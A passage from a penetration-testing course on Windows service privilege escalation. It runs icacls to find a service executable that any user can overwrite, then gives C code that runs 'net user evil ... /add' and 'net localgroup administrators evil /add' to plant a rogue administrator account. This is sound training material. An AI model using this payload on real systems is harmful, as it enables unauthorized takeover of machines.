![](bbox=[0.13, 0.04, 0.29, 0.09])

As a next step, we’ll enumerate the permissions on the target service with the `icacls`⁵²⁵ Windows utility. This utility will output the service’s Security Identifiers (or SIDs⁵²⁶) followed by a permission mask, which are defined in the icacls documentation.⁵²⁷ The most relevant masks and permissions are listed below:

| Mask | Permissions |
| :--- | :--- |
| F | Full access |
| M | Modify access |
| RX | Read and execute access |
| R | Read-only access |
| W | Write-only access |

*Table 7 - icacls permissions mask*

We can run `icacls`, passing the full service name as an argument. The command output will enumerate the associated permissions:

```
C:\Users\student> icacls "C:\Program Files\Serv\io\bin\Serv\ioService.exe"
C:\Program Files\Serv\io\bin\Serv\ioService.exe           BUILTIN\Users:(I)(F)
                                                        NT AUTHORITY\SYSTEM:(I) (F)
                                                        BUILTIN\Administrators:(I) (F)
                                                        APPLICATION PACKAGE AUTHORITY\ALL APPL ICATION PACKAGES:(I) (RX)

Successfully processed 1 files; Failed processing 0 files

*Listing 565 - icacls output for the Serv\ioService.exe service*
```

As suspected, the permissions associated with the `Serv\ioService.exe` executable are quite interesting. Specifically, it appears that any user (BUILTIN\Users) on the system has full read and write access to it. This is a serious vulnerability.⁵²⁸

In order to exploit this type of vulnerability, we can replace `Serv\ioService.exe` with our own malicious binary and then trigger it by restarting the service or rebooting the machine.

We’ll demonstrate this attack with an example. The following C code will create a user named “evil” and add that user to the local Administrators group using the `system`⁵²⁹ function. The compiled version of this code will serve as our malicious binary.

```
#include <stdlib.h>

int main ()
{
    int i;

    i = system ("net user evil Evilpass /add");
    i = system ("net localgroup administrators evil /add");
}
```

⁵²⁵ (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
⁵²⁶ (Microsoft, 2017), https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-systems
⁵²⁷ (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls#remarks
⁵²⁸ (Gjoko Krstic, 2017), https://www.exploit-db.com/exploits/41959/
⁵²⁹ (Microsoft, 2016), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=vs-2019